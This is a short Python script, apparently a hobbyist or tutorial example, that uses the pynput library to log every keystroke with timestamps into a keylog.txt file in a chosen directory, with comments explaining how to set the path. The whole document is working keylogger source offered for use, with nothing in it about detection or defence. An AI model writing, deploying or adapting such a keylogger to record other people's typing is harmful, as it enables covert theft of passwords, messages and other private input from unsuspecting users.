from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:/Users/shailendra/Desktop/"
#There paste your directory,where you want to dump all key strokes.

logging.basicConfig(filename= (log_dir + "keylog.txt"), level= logging.DEBUG, format = '%(asctime)s: %(message)s')
#Above code line with generate an keylog.txt file in that (Log_dir) location.

def on_press(key):
    logging.info(str(key))
#This func will get all the key storkes.

with Listener(on_press = on_press) as listener:
    listener.join()
